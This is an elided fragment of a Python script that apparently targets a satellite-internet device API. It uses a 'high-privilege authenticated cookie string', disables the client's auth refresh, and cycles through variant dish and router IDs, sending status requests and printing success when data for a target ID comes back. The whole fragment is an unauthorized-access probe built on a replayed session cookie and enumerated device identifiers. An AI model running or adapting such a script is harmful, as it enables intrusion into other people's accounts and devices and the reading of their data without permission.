...
def main():
    # THE FULL HIGH-PRIVILEGE AUTHENTICATED COOKIE STRING
    cookies_str = (
    ...
    with patch.object(GrpcWebBaseClient, "_refresh_auth", lambda x: None):
        try:
            client = GrpcWebClient(cookies_str, str(session_dir_path))
            
            variations = [
                "ut01000000-00000000-008b65ad",
                "0100000000000000008B65AD",
                "Router-0100000000000000008B65AD"
            ]
            
            for target in variations:
                print(f"[*] Trying Target ID: {target}")
                req = Request(target_id=target, get_status=GetStatusRequest())
                try:
                    resp = client.call(req)
                    print(f"[+] SUCCESS! Dish Status received for ID: {target}")
                    data = MessageToDict(resp.dish_get_status, including_default_value_fields=True)
